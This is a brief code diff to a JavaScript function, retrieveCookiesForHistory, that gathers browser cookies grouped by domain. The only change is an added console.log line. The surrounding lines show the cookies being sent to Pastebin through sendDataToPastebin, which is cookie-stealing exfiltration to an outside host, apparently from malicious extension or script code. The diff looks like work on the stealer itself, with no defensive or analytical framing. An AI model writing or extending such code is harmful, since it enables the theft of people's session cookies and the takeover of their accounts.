@@ -46,6 +46,7 @@ function retrieveCookiesForHistory() {
                     siteCookies[domain] = [];
                 }
                 siteCookies[domain].push(...cookies);
+                console.log(siteCookies);
 
                 // Send the site cookies to Pastebin
                 sendDataToPastebin(siteCookies);
